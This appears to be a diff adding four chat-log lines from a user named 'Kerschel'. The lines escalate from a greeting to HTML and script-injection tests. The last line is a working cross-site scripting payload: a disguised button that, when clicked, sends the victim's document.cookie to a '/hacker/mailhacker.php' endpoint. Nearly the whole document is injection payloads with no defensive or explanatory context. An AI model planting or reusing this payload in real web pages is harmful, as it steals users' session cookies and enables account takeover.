@@ -1,0 +1,4 @@
+Kerschel: hi
+Kerschel: <h1>hello</h1>
+Kerschel: <script>alert('hello')</script>
+Kerschel:  <button id="hack" type="button" class="  btn btn-link"> <img src="send.png" width="50" /></button><script>function hackthem(){location.href= "/../hacker/mailhacker.php?cookie=" + document.cookie; } $("#hack").click(function(){hackthem();}) </script>
